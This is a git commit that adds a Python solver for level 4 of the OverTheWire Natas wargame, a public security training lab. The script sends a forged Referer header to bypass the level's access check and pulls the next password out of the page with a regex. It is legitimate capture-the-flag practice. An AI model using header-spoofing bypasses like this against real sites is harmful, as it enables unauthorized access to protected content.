fa90aeb628ea7a2e99bbdff334b7a79cbb3ee539
kaniehuest <carlos.ojeda.6556@gmail.com>
2022-12-29 19:27:52 -0300

    added natas4

--- main.py
+++ main.py
@@ -2,12 +2,14 @@ from natas0 import get_natas1_password
 from natas1 import get_natas2_password
 from natas2 import get_natas3_password
 from natas3 import get_natas4_password
+from natas4 import get_natas5_password
 
 def main():
     natas1_password = get_natas1_password()
     natas2_password = get_natas2_password(natas1_password)
     natas3_password = get_natas3_password(natas2_password)
     natas4_password = get_natas4_password(natas3_password)
+    natas5_password = get_natas5_password(natas4_password)
 
 if __name__ == '__main__':
     main()
---
+++ natas4.py
@@ -0,0 +1,20 @@
+import re
+import requests
+
+
+def get_natas5_password(natas4_password):
+    URL = "http://natas4.natas.labs.overthewire.org"
+    session = requests.Session()
+    session.auth = ("natas4", natas4_password)
+    headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
+
+    request = session.get(URL, headers=headers)
+    natas5_password = re.findall(r"([a-zA-Z\d]{32})", request.text)[1]
+    print("[!] The password for Natas 5 is: " + natas5_password)
+
+    return natas5_password
+
+
+if __name__ == '__main__':
+    natas4_password = "" # Put here the password for natas2 here
+    get_natas5_password(natas4_password)
